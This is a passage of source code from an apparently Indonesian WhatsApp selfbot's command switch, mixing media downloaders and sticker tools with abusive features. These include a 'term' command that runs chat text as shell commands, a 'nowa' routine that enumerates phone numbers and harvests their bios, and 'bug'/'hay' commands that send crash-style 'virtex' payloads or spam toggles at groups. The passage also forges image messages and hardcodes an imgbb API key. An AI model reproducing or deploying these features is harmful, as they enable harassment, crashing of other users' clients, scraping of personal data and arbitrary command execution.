					const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi','Tidak Akan Pernah']
					const koh = kapan[Math.floor(Math.random() * kapan.length)]
					Haikal.sendMessage(from, 'Pertanyaan : *'+kapankah+'*\n\nJawaban : '+ koh, text, { quoted: mek })
					break
     case 'apakah':
         			  if (!mek.key.fromMe) return freply('SELF-BOT')
			if (!isGroup) return reply(mess.only.group)
					apakah = body.slice(1)
					const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi','Tanyakan Ayam']
					const kah = apa[Math.floor(Math.random() * apa.length)]
					Haikal.sendMessage(from, 'Pertanyaan : *'+apakah+'*\n\nJawaban : '+ kah, text, { quoted: mek })
					break
	case 'attp':
			if (!mek.key.fromMe) return freply('SELF-BOT')
			if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`_Teksnya Mana Boss_\n*Contoh ${prefix}attp Wajahku Ganteng*`)
				attp2 = await getBuffer(`https://api.xteam.xyz/attp?file&text=${body.slice(6)}`)
				Haikal.sendMessage(from, attp2, sticker, {quoted: mek})
				break
	case 'ttp':
			if (!mek.key.fromMe) return freply('SELF-BOT')
			if (!isGroup) return reply(mess.only.group)
				if (args.length < 1) return reply(`_Teksnya Mana Boss_\n*Contoh ${prefix}attp Wajahku Ganteng*`)
				ttp = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${body.slice(5)}`)
				Haikal.sendMessage(from, ttp, sticker, {quoted: mek})
				break
	case 'emoji':
			if (!q) return freply('emojinya?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
	case 'ytmp3':
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
			let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				yta(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
			    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
				const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captions)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})
				})
				} catch (err) {
				reply(mess.error.api)
				}
				break
      case 'pap':
			if (!mek.key.fromMe) return freply('SELF-BOT')
			if (!isGroup) return reply(mess.only.group)
              bilan = fs.readFileSync('./mp3/sound12');
              Haikal.sendMessage(from, bilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
              await limitAdd(sender)
              break
      case 'didunia':
			if (!mek.key.fromMe) return freply('SELF-BOT')
			if (!isGroup) return reply(mess.only.group)
              bilan = fs.readFileSync('./mp3/didunia');
              Haikal.sendMessage(from, bilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
              await limitAdd(sender)
              break
      case 'welot':
			if (!mek.key.fromMe) return freply('SELF-BOT')
			if (!isGroup) return reply(mess.only.group)
              bilan = fs.readFileSync('./mp3/welot');
              Haikal.sendMessage(from, bilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
              await limitAdd(sender)
              break
      case 'barabere':
			if (!mek.key.fromMe) return freply('SELF-BOT')
			if (!isGroup) return reply(mess.only.group)
              bilan = fs.readFileSync('./mp3/barabere');
              Haikal.sendMessage(from, bilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
              await limitAdd(sender)
              break
      case 'fyp':
			if (!mek.key.fromMe) return freply('SELF-BOT')
			if (!isGroup) return reply(mess.only.group)
              bilan = fs.readFileSync('./mp3/fyp');
              Haikal.sendMessage(from, bilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
              await limitAdd(sender)
              break
      case 'myfather':
			if (!mek.key.fromMe) return freply('SELF-BOT')
			if (!isGroup) return reply(mess.only.group)
              bilan = fs.readFileSync('./mp3/myfather');
              Haikal.sendMessage(from, bilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
              await limitAdd(sender)
              break
      case 'ladadida':
			if (!mek.key.fromMe) return freply('SELF-BOT')
			if (!isGroup) return reply(mess.only.group)
              bilan = fs.readFileSync('./mp3/ladadida');
              Haikal.sendMessage(from, bilan, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
              await limitAdd(sender)
              break
    case 'image':
            if (args.length < 1) return reply('Masukan teks!')
            const gimg = args.join('');
            reply(mess.wait)
            gis(gimg, async (error, result) => {
            n = result
            images = n[Math.floor(Math.random() * n.length)].url
            Haikal.sendMessage(from,{url:images},image,{quoted:mek})
            });
            break
 	case 'tiktok':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return freply('Linknya?')
 		reply(mess.wait)
		tik.ssstik(`${args[0]}`)
    		.then(result => {
    		console.log(result)
    		const { videonowm, videonowm2, text } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${videonowm2}`)
    		.then(async (a) => {
    		me = `*Title* : ${text}\n*Link* : ${a.data}`
		Haikal.sendMessage(from,{url:`${videonowm}`},video,{mimetype:'video/mp4',quoted:mek,caption:me})
		})
		})
     		.catch(e => console.log(e))
     		break
    case 'tiktokaudio':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return freply('Linknya?')
 		reply(mess.wait)
 		tik.ssstik(`${args[0]}`)
    		.then(result => {
    		const { music,text } = result
		Haikal.sendMessage(from,{url:`${music}`},audio,{mimetype:'audio/mp4',filename : `${text}`,quoted:mek})
		})
     		.catch(e => console.log(e))
     		break
    case 'brainly':
			if (args.length < 1) return reply('Pertanyaan apa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			Haikal.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
            })              
			break
    case 'ig':
        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
        if (!q) return freply('Linknya?')
        reply(mess.wait)
	    igdl(args[0])
	    .then(async(result) => {
            for (let ink of result.url_list)	{
            if (ink.includes('.mp4')){
            const igvdl = await getBuffer(ink)	
	    Haikal.sendMessage(from,igvdl,video,{mimetype:'video/mp4',quoted:mek,caption:'Nih'})
            } else if (ink.includes('.jpg')){
            const igpdl = await getBuffer(ink)
            Haikal.sendMessage(from,igpdl,image,{mimetype:'image/jpeg',quoted:mek,caption:'Nih'})
	    }
            }
	    })
	    break
    case 'igstalk':
            if (!q) return freply('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break    
    case 'fb':
            if (!q) return reply('Linknya?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(mess.Iv)
            reply(mess.wait)
            te = args.join(' ')
            freply(mess.wait)
            Fb.getInfo(`${te}`)
            .then(G => {
            ten = `${G.download.sd}`
            tek = `${G.title}`
            sendMediaURL(from,ten,`*Title* : ${tek}\n\n*Link* : ${ten}`)
            })
            break    
	case 'term':
			if (!q) return freply(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return freply(`SELF-BOT:~ ${err}`)
			if (stdout) {
			freply(stdout)
			}
			})
		    break 
    case 'join':
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            hen = args[0]
            if (!q) return freply('Masukan link group')
            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
            if (!codeInvite) return freply ('pastikan link sudah benar!')
            var response = await Haikal.acceptInvite(codeInvite)
            freply('SUKSES')
            } catch {
            freply('LINK ERROR!')
            }
            break
    case'twitter':
            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
            if (!q) return freply('Linknya?')
            ten = args[0]
            var res = await twitterGetUrl(`${ten}`)
            .then(g => {
            ren = `${g.download[2].url}`
            sendMediaURL(from,ren,'DONE')
            })
            break
    case 'runtime':
    case 'test':
            run = process.uptime() 
            teks = `${kyun(run)}`
            freply(teks)
            break  
	case 'speed':
	case 'ping':
			const timestamp = speed();
			const latensi = speed() - timestamp
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `*${teks}Speed: ${latensi.toFixed(4)} Second*`
			freply(pingnya)
			})
			break  
    case 'totag':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4',
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await Haikal.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await Haikal.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: mek
            }
            ini_buffer = fs.readFileSync(file)
            Haikal.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'tomp4':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await Haikal.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result,'Done')
            })
            }else {
            reply('reply stiker')
            }
            fs.unlinkSync(owgi)
            break
    case 'tourl':
            if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await Haikal.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break	
    case 'inspect':
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            if (!q) return reply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await Haikal.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             Haikal.sendMessage(from,par,text,{quoted:mek,contextInfo:{mentionedJid:jids}})
             } catch {
             reply('Link error')
             }
             break
case 'virgam':            
if (!mek.key.fromMe) return 
buf = fs.readFileSync('./stik/anjay.jpeg'),
imeu = await Haikal.prepareMessage('0@s.whatsapp.net', buf, fakethumb) 
imeg = imeu.message.imageMessage
            res = await Haikal.prepareMessageFromContent(from,{
				                        "imageMessage": {
                                                        "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/deden.jpeg'),
						"sellerJid": "6285714170944@s.whatsapp.net",
						"token": "AR5oPgz0Gn0eG5P86rufp+E5etQtxFmuQA3KqXbJndr9pg==",
    "contextInfo": {
      "forwardingScore": 3,
      "isForwarded": false
    }
  }
}, {quoted:mek, contextInfo:{}}) 
Haikal.relayWAMessage(res)
break
case 'virgam1':            
if (!mek.key.fromMe) return 
buf = fs.readFileSync('./stik/fake.jpeg'),
imeu = await Haikal.prepareMessage('0@s.whatsapp.net', buf, fakethumb) 
imeg = imeu.message.imageMessage
            res = await Haikal.prepareMessageFromContent(from,{
				                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/deden.jpeg'),
						"sellerJid": "6285714170944@s.whatsapp.net",
						"token": "AR5oPgz0Gn0eG5P86rufp+E5etQtxFmuQA3KqXbJndr9pg==",
    "contextInfo": {
      "forwardingScore": 3,
      "isForwarded": true
    }
  }
}, {quoted:mek, contextInfo:{}}) 
Haikal.relayWAMessage(res)
break
case 'virgam2':            
if (!mek.key.fromMe) return 
buf = fs.readFileSync('./stik/deden.jpeg'),
imeu = await Haikal.prepareMessage('0@s.whatsapp.net', buf, fakethumb) 
imeg = imeu.message.imageMessage
            res = await Haikal.prepareMessageFromContent(from,{
				                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/deden.jpeg'),
						"sellerJid": "6285714170944@s.whatsapp.net",
						"token": "AR5oPgz0Gn0eG5P86rufp+E5etQtxFmuQA3KqXbJndr9pg==",
    "contextInfo": {
      "forwardingScore": 3,
      "isForwarded": true
    }
  }
}, {quoted:mek, contextInfo:{}}) 
Haikal.relayWAMessage(res)
break
case 'virgam3':            
if (!mek.key.fromMe) return 
buf = fs.readFileSync('./stik/bacotah.jpeg'),
imeu = await Haikal.prepareMessage('0@s.whatsapp.net', buf, fakethumb) 
imeg = imeu.message.imageMessage
            res = await Haikal.prepareMessageFromContent(from,{
				                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/deden.jpeg'),
						"sellerJid": "6285714170944@s.whatsapp.net",
						"token": "AR5oPgz0Gn0eG5P86rufp+E5etQtxFmuQA3KqXbJndr9pg==",
    "contextInfo": {
      "forwardingScore": 3,
      "isForwarded": true
    }
  }
}, {quoted:mek, contextInfo:{}}) 
Haikal.relayWAMessage(res)
break
case 'assalamualaikum':
if (!mek.key.fromMe) return 
	const Haikal5 = fs.readFileSync('./stik/deden.jpeg')
Haikal.sendMessage(from,Haikal5,image,{mimetype: Mimetype.fakethumb,quoted : mek, thumbnail: fs.readFileSync('./stik/deden.jpeg')})
break      
case 'pp':
if (!mek.key.fromMe) return 
	const Haikal6 = fs.readFileSync('./stik/anjay2.jpeg')
Haikal.sendMessage(from,Haikal6,image,{mimetype: Mimetype.fakethumb,quoted : mek, thumbnail: fs.readFileSync('./stik/deden.jpeg')})
break      
case 'bang':
if (!mek.key.fromMe) return 
	const Haikal7 = fs.readFileSync('./stik/anjay.jpeg')
Haikal.sendMessage(from,Haikal7,image,{mimetype: Mimetype.fakethumb,quoted : mek, thumbnail: fs.readFileSync('./stik/deden.jpeg')})
break      
case 'alah':
if (!mek.key.fromMe) return 
	const Haikal8 = fs.readFileSync('./stik/anjir.jpeg')
Haikal.sendMessage(from,Haikal8,image,{mimetype: Mimetype.fakethumb,quoted : mek, thumbnail: fs.readFileSync('./stik/deden.jpeg')})
break      
case 'kal':
if (!mek.key.fromMe) return 
	const Haikal4 = fs.readFileSync('./stik/bacotah.jpeg')
Haikal.sendMessage(from,Haikal4,image,{mimetype: Mimetype.fakethumb,quoted : mek, thumbnail: fs.readFileSync('./stik/deden.jpeg')})
break
// Kalkulator ( HW MODS WA )
case 'kalkulator':
if (args.length < 1) return reply(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
let qsd = args.join(" ")
if (typeof mathjs.evaluate(qsd) !== 'number') {
reply('Error')
} else {
reply(`\`\`\`「 Kalkulator 」\`\`\`\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
}
break
case 'smeme':
pe = args.join('')
            top = pe.split('|')[0]
            bottom = pe.split('|')[1]
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length > 0) {
ger = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
owgi = await  Haikal.downloadAndSaveMediaMessage(ger)
anu = await imgbb("cedeb44b8d204947a6833ca1412ca77d", owgi)
teks = `${anu.display_url}`
ranp = getRandom('.gif')
rano = getRandom('.webp')
anu1 = `https://api.memegen.link/images/custom/${top}/${bottom}.png?background=${teks}`
sendStickerFromUrl(from, `${anu1}`)
} else {
reply('Gunakan foto/stiker!')
}
break
// Set Prefix ( HW MODS WA )
case 'setprefix':
if (!mek.key.fromMe) return 
if (args.length < 1) return freply(`Example:\n•> ${prefix}setprefix multi\n•> ${prefix}setprefix <query>`)
if (args[0] === 'multi') {
if (multi === true) return
multi = true
freply(`\`\`\`Succes change prefix =「 Multi Prefix 」\`\`\``)
} else {
multi = false
pref = args[0]
freply(`\`\`\`Succes change prefix =「 ${args[0]} 」\`\`\``)
}
break
// Colong Nomor Yok
case 'nowa':
                var teks = body.slice(6)
                if (!teks) return reply("lah?")
                var numberPattern = /\d+/g;
                var nomer = teks.match(numberPattern)
                var random_length = teks.length - nomer[0].length;
                if (random_length == 1) {
                    var random = 10
                } else if (random_length == 2) {
                    var random = 100
                } else if (random_length == 3) {
                    var random = 1000
                } else if (random_length == 4) {
                    var random = 10000
                }
                console.log(random)
                var nomerny = `List Nomer\n`
                for (let i = 0; i < random; i++) {
                    var nu = ['1','2','3','4','5','6','7','8','9']
                    var dom1 = nu[Math.floor(Math.random() * nu.length)]
                    var dom2 = nu[Math.floor(Math.random() * nu.length)]
                    var dom3 = nu[Math.floor(Math.random() * nu.length)]
                    var dom4 = nu[Math.floor(Math.random() * nu.length)]
                    if (random_length == 1) {
                        var rndm = `${dom1}`
                        var gdaftar = []
                    } else if (random_length == 2) {
                        rndm = `${dom1}${dom2}`
                    } else if (random_length == 3) {
                        rndm = `${dom1}${dom2}${dom3}`
                    } else if (random_length == 4) {
                        rndm = `${dom1}${dom2}${dom3}${dom4}`
                    }
                    var anu = await Haikal.isOnWhatsApp(`${nomer[0]}${i}@s.whatsapp.net`);
                    var bionye = await Haikal.getStatus(`${nomer[0]}${i}@s.whatsapp.net`);
                    var anuu = anu ? anu : false;
                    try {
                        if (nomerny.includes(anu.jid.split("@")[0])) {
                            //console.log(i)
                        } else {
                            nomerny += `NO: wa.me/${anu.jid.split("@")[0]}\nBIO: ${bionye.status}\n\n`
                        }
                    } catch {
                        console.log(i)
                    }
                }
                reply(nomerny)
                console.log("Done dump")
				break
// kick Anggota group
case 'kick':
			if (!isGroup) return reply(mess.only.group)
			if (!isGroupAdmins) return reply(mess.only.admin)
			if (!isBotGroupAdmins) return reply(mess.only.Badmin)
			if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('𝗧𝗮𝗴 𝘁𝗮𝗿𝗴𝗲𝘁 ??𝗮𝗻𝗴 𝗶𝗻𝗴𝗶𝗻 𝗱𝗶 𝘁𝗲𝗻𝗱𝗮𝗻𝗴!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `╭────────────────⊱
║> *ASEK DAPAT JATAH KICK*
╰────────────────⊱
 🤭 :\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						Haikal.groupRemove(from, mentioned)
					} else {
						mentions(`╭────────────────⊱
║> *ASEK DAPAT JATAH KICK*
╰────────────────⊱
 @${mentioned[0].split('@')[0]} 🤭`, mentioned, true)
						Haikal.groupRemove(from, mentioned)
					}
					break
// Bug Invite Group ( HW MODS WA )
case 'hay':
if (!mek.key.fromMe) return 
res = await Haikal.prepareMessageFromContent(from,{
"groupInviteMessage": {
"groupJid": "34699303450-1355008702@g.us",
"inviteCode": "BqtzrhqPxvFG2Kg2k1jaUi",
"inviteExpiration": "162533333338378",
"groupName": `HW MODS WA${vipi,virtex}`,
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAAAAwQCBQEGAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAAD55qqzfkzyvce5lk9iHM5oipvuDUWq744x2uXK9IcizwS98dWekvY4fSi/kdPjVHTHYkx6OM1TVDlmGGtIf5Urd4qQ0OMaC0xgZ7Z2ErWDzyA8/wD/xAAlEAACAgICAQQCAwAAAAAAAAABAgARAxIhMQQQEyJBBVEyYXH/2gAIAQEAAT8AiJGIQTclo2AFNxMQs6sJlx0JrYjCopBMxFZkUk31HTCFB2sxfI0WhA4PO3M23xm4RSiPEQfqZWGHHYHJiszNETdyonstfHUyKBUwt3Z4Ahyq/HUeognlglFM8FF5cnqY/GwM5yJM+AdqvJnk49AOOZjXZpqnVczIFHAMQwKGUg9TD8M7J9GIpC/EAQgMKufkV10ifyEetbHomVR9zHkUjueQQM26GeN5Yyrq4owFMYsGec5yZJ0YoAWzMhBYkQAsIuN1oWI4LaCgLgVxdAfGXlI74hVj8j1FQmiR0ajK1VCNSRENAxcgDcwsCyfoT3e/6iuK0sfKzA9AD6qpsBV9XcbIDtHINf56AxDLBEWrhaF7hPp//8QAFhEBAQEAAAAAAAAAAAAAAAAAITAQ/9oACAECAQE/AMYN/wD/xAAdEQACAQUBAQAAAAAAAAAAAAAAAQIQERIhQTFh/9oACAEDAQE/APRoeOh2T1Tld2GIT5Y3b4RrlJGUmO8XREXo4NsZ/9k=",
"caption": "https://chat.whatsapp.com/BqtzrhqPxvFG2Kg2k1jaUi",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted:mek, contextInfo:{}})
Haikal.relayWAMessage(res)
await setTimeout(() => {
freply('Limit-anda-sudah-habis-....!!! Pulsa anda tidak mencukupi untuk melakukan WhatsApp kepada Haikal .. !!! Terimakasih..')
}, 3000)
break
// Bug group By Haikal
	case 'bug':
					if (!mek.key.fromMe) return 
					if (args.length < 1) return reply('Jumlahnya?')
				 for (let i = 0; i < args[0]; i++) {
await Haikal.toggleDisappearingMessages(from, 0)
}
freply('Mamam Tuh Bug'+args.join(' '))
					break
// Bug Lokasi
case 'buglokasi':
if (!mek.key.fromMe) return 
buffer = fs.readFileSync(`./stik/hwmods.png`)
